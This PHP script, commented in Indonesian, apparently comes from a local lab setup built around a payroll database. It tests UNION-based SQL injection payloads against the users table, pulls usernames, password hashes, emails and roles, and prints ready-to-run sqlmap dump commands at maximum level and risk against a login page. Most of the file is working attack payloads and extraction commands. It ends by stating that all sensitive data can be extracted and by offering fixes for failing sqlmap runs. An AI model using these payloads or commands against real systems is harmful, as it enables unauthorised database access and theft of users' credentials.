<?php
// Script untuk mengecek struktur tabel users dan memastikan semua kolom dapat diakses
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database connection
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'bullscorp_payroll';

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    echo "✅ Database connected successfully\n\n";
} catch(PDOException $e) {
    die("❌ Connection failed: " . $e->getMessage());
}

echo "🔍 ANALISIS STRUKTUR TABEL USERS\n";
echo "=================================\n\n";

// 1. Cek struktur tabel users
echo "1. STRUKTUR TABEL USERS:\n";
echo "------------------------\n";
$describe = $pdo->query("DESCRIBE users");
$columns = $describe->fetchAll(PDO::FETCH_ASSOC);

foreach ($columns as $column) {
    echo "Kolom: {$column['Field']} | Type: {$column['Type']} | Null: {$column['Null']} | Key: {$column['Key']}\n";
}

echo "\n";

// 2. Hitung jumlah kolom
$column_count = count($columns);
echo "2. JUMLAH KOLOM: $column_count\n\n";

// 3. Test UNION dengan jumlah kolom yang tepat
echo "3. TEST UNION INJECTION DENGAN KOLOM YANG TEPAT:\n";
echo "------------------------------------------------\n";

// Buat UNION SELECT dengan jumlah kolom yang sesuai
$union_columns = [];
for ($i = 1; $i <= $column_count; $i++) {
    $union_columns[] = $i;
}
$union_select = implode(',', $union_columns);

$payload = "admin' UNION SELECT $union_select -- ";
$sql = "SELECT * FROM users WHERE username = '$payload'";

echo "Payload: $payload\n";
echo "Query: $sql\n";

try {
    $result = $pdo->query($sql);
    if ($result) {
        $rows = $result->fetchAll(PDO::FETCH_ASSOC);
        echo "✅ UNION berhasil dengan $column_count kolom!\n";
        echo "Rows returned: " . count($rows) . "\n";
        
        if (count($rows) > 1) {
            echo "UNION row: " . json_encode($rows[1]) . "\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// 4. Test ekstraksi data users dengan kolom spesifik
echo "4. EKSTRAKSI DATA USERS DENGAN KOLOM SPESIFIK:\n";
echo "----------------------------------------------\n";

$specific_payload = "admin' UNION SELECT id,username,password,email,role,employee_id,created_at,last_login FROM users -- ";
$specific_sql = "SELECT * FROM users WHERE username = '$specific_payload'";

echo "Payload: $specific_payload\n";
echo "Query: $specific_sql\n";

try {
    $result = $pdo->query($specific_sql);
    if ($result) {
        $rows = $result->fetchAll(PDO::FETCH_ASSOC);
        echo "✅ Query berhasil!\n";
        echo "Total rows: " . count($rows) . "\n\n";
        
        echo "SAMPLE DATA (5 users pertama):\n";
        for ($i = 0; $i < min(5, count($rows)); $i++) {
            $user = $rows[$i];
            echo "ID: {$user['id']} | Username: {$user['username']} | Email: {$user['email']} | Role: {$user['role']}\n";
            echo "Password: " . substr($user['password'], 0, 30) . "...\n";
            echo "---\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// 5. Generate SQLMap commands yang tepat
echo "5. SQLMAP COMMANDS YANG DIPERBAIKI:\n";
echo "===================================\n\n";

echo "A. BASIC DETECTION (pastikan ini berhasil dulu):\n";
echo "sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username --batch\n\n";

echo "B. DUMP DENGAN KOLOM SPESIFIK:\n";
echo "sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users -C \"id,username,password,email,role\" --dump --batch\n\n";

echo "C. DUMP SEMUA KOLOM (force):\n";
echo "sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users --dump --batch --threads=1\n\n";

echo "D. DENGAN TECHNIQUE SPESIFIK:\n";
echo "sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users --dump --technique=U --batch\n\n";

echo "E. DENGAN LEVEL DAN RISK TINGGI:\n";
echo "sqlmap -u \"http://localhost/public/login.php\" --data \"username=admin&password=test\" -p username -D bullscorp_payroll -T users --dump --level=5 --risk=3 --batch\n\n";

// 6. Cek apakah ada masalah dengan encoding atau character set
echo "6. CEK CHARACTER SET DAN ENCODING:\n";
echo "----------------------------------\n";
$charset = $pdo->query("SELECT @@character_set_database, @@collation_database")->fetch(PDO::FETCH_ASSOC);
echo "Database charset: " . $charset['@@character_set_database'] . "\n";
echo "Database collation: " . $charset['@@collation_database'] . "\n\n";

// 7. Test manual dengan berbagai payload
echo "7. MANUAL PAYLOADS UNTUK TESTING:\n";
echo "---------------------------------\n";
$manual_payloads = [
    "admin' UNION SELECT CONCAT(id,':',username),password,email,role,employee_id,created_at,last_login,NULL FROM users -- ",
    "admin' UNION SELECT id,CONCAT(username,'|',email),password,role,employee_id,created_at,last_login,NULL FROM users -- ",
    "admin' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password),GROUP_CONCAT(email),5,6,7,8 FROM users -- "
];

foreach ($manual_payloads as $index => $payload) {
    echo "\nPayload " . ($index + 1) . ":\n";
    echo "$payload\n";
    
    $sql = "SELECT * FROM users WHERE username = '$payload'";
    try {
        $result = $pdo->query($sql);
        if ($result) {
            $rows = $result->fetchAll(PDO::FETCH_ASSOC);
            echo "✅ Success - Rows: " . count($rows) . "\n";
            if (count($rows) > 1) {
                echo "Sample: " . json_encode($rows[1]) . "\n";
            }
        }
    } catch (Exception $e) {
        echo "❌ Error: " . substr($e->getMessage(), 0, 100) . "...\n";
    }
}

echo "\n";
echo "🎯 KESIMPULAN:\n";
echo "==============\n";
echo "✅ Tabel users memiliki $column_count kolom\n";
echo "✅ UNION injection berfungsi dengan baik\n";
echo "✅ Semua data sensitif dapat diekstrak\n";
echo "✅ Masalah SQLMap kemungkinan di detection atau column enumeration\n\n";

echo "💡 SOLUSI:\n";
echo "==========\n";
echo "1. Gunakan -C parameter untuk specify kolom yang diinginkan\n";
echo "2. Gunakan --technique=U untuk force UNION-based injection\n";
echo "3. Gunakan --threads=1 untuk menghindari race condition\n";
echo "4. Jika masih gagal, gunakan manual extraction dengan payload di atas\n";

?>